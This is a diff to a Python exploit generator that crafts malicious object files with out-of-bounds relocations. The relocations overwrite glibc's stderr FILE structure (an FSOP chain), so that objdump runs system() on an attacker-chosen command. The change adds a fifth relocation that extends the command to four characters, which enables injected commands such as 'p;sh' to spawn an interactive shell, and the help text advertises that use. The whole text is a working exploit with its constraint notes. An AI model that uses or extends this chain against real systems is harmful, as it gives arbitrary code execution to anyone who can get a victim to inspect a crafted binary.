@@ -35,12 +35,13 @@ memory — specifically libc's _IO_2_1_stderr_ structure.
 
 EXPLOITATION CHAIN (FSOP)
 -------------------------
-4 OOB PCREL26 relocations corrupt _IO_2_1_stderr_ fields:
+5 OOB PCREL26 relocations corrupt _IO_2_1_stderr_ fields:
 
-  1. _flags[0:3]      <- command bytes (e.g., "ps\\0")
+  1. _flags[0:3]      <- command bytes (e.g., "p;sh")
   2. _IO_write_ptr    <- non-zero (triggers flush -> _IO_wfile_overflow)
   3. _wide_data[0:3]  <- pointer to fake _IO_wide_data in section buffer
   4. vtable[0:3]      <- _IO_wfile_jumps (enters wide file code path)
+  5. _flags[3]+pad    <- cmd[3] + null padding (extends command to 4 chars)
 
 Execution flow when objdump writes to stderr:
   _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE
@@ -49,14 +50,17 @@ Execution flow when objdump writes to stderr:
 
 COMMAND CONSTRAINTS
 -------------------
-The command is encoded in _flags (3-byte write). It must be exactly
-2 ASCII characters (byte[2] = null terminator) satisfying:
+The command is encoded across _flags[0:4] (reloc 0 + reloc 4 combined).
+Supports 2 to 4 ASCII characters. Only the first two bytes are constrained
+by glibc's FILE flag checks:
 
   cmd[0] & 0x02 == 0   (_IO_UNBUFFERED must not be set)
   cmd[0] & 0x08 == 0   (_IO_NO_WRITES must not be set)
   cmd[1] & 0x20 != 0   (_IO_IS_FILEBUF must be set)
 
-Valid: "ps" (0x70, 0x73)  |  Invalid: "ls" (0x6C has bit 3 set)
+  cmd[2], cmd[3] are unconstrained (any non-null char).
+
+Valid: "ps", "p;sh", "p;ls", "p;id"  |  Invalid: "ls", "sh" (cmd[0] fails)
 """
 
 import argparse
@@ -153,10 +157,10 @@ class FSOPChain:
 
     def __init__(self, data_addr: int, stderr_addr: int, system_addr: int,
                  wfile_jumps: int, cmd: str = "ps"):
-        if len(cmd) < 2:
-            raise ValueError("Command must be at least 2 characters")
+        if not (2 <= len(cmd) <= 4):
+            raise ValueError("Command must be 2 to 4 characters")
 
-        b = (cmd + "\x00\x00\x00").encode()[:3]
+        b = (cmd + "\x00\x00\x00").encode()[:4]
         if b[0] & 0x0A:
             raise ValueError(
                 f"cmd[0]=0x{b[0]:02x} violates _IO_UNBUFFERED/_IO_NO_WRITES constraint"
@@ -170,7 +174,11 @@ class FSOPChain:
         self.stderr_addr = stderr_addr
         self.system_addr = system_addr
         self.wfile_jumps = wfile_jumps
+        self.cmd_bytes = b
+        # reloc 0: writes _flags[0,1,2] = cmd[0], cmd[1], cmd[2]
         self.cmd_low26 = (b[0] << 16) | (b[1] << 8) | b[2]
+        # reloc 4: writes _flags[2] low bits + _flags[3] + padding[0,1]
+        self.cmd_ext_low26 = ((b[2] & 0x03) << 24) | (b[3] << 16)
 
         # Build section buffer with fake FSOP structures
         self.section = bytearray(DEBUG_SIZE)
@@ -261,6 +269,17 @@ class FSOPChain:
             self.stderr_addr + OFF_VTABLE - 1,
             (wfb[0] << 16) | (wfb[1] << 8) | wfb[2],
             "vtable[0:3] := _IO_wfile_jumps addr",
+        )
+
+        # Reloc 4 (new): _flags[2] low bits + _flags[3] = cmd[3] + clear padding
+        # BE32 at stderr+2 covers [_flags[2], _flags[3], padding[0], padding[1]].
+        # Low 26 bits write: _flags[2] low 2 bits (consistent with reloc 0),
+        # _flags[3] = cmd[3], padding[0,1] = 0x00 (ensures null termination at byte 4).
+        b = self.cmd_bytes
+        add(
+            self.stderr_addr + 2,
+            self.cmd_ext_low26,
+            f"_flags[3] := cmd[3]=0x{b[3]:02x} ({chr(b[3]) if b[3] >= 0x20 else '?'!r}), padding cleared",
         )
 
         return relocs
@@ -385,6 +404,10 @@ def generate(cmd: str = "ps") -> tuple[list[dict], bytearray]:
     fj = IO_FILE_JUMPS.to_bytes(8, "little")
     mem[(STDERR_ADDR + 0xD7 - DATA_ADDR) & 0xFFFFFFFF] = (fj[0] << 16) | (fj[1] << 8) | fj[2]
 
+    # _flags[2..5]: BE32 at stderr+2 = [_flags[2]=0xAD, _flags[3]=0xFB, pad=0x00, pad=0x00]
+    # (_flags = 0xFBAD2086 LE → bytes [0x86, 0x20, 0xAD, 0xFB])
+    mem[(STDERR_ADDR + 2 - DATA_ADDR) & 0xFFFFFFFF] = 0xADFB0000
+
     return chain.build(mem), chain.section
 
 
@@ -407,9 +430,10 @@ def main():
     parser.add_argument(
         "--cmd", default="ps",
         help=(
-            "Command to execute (2 chars). "
+            "Command to execute (2-4 chars). "
             "Must satisfy: cmd[0] & 0x0A == 0, cmd[1] & 0x20 != 0. "
-            "Default: 'ps'"
+            "cmd[2] and cmd[3] are unconstrained. "
+            "Default: 'ps'. Example: 'p;sh' for interactive shell."
         ),
     )
     args = parser.parse_args()
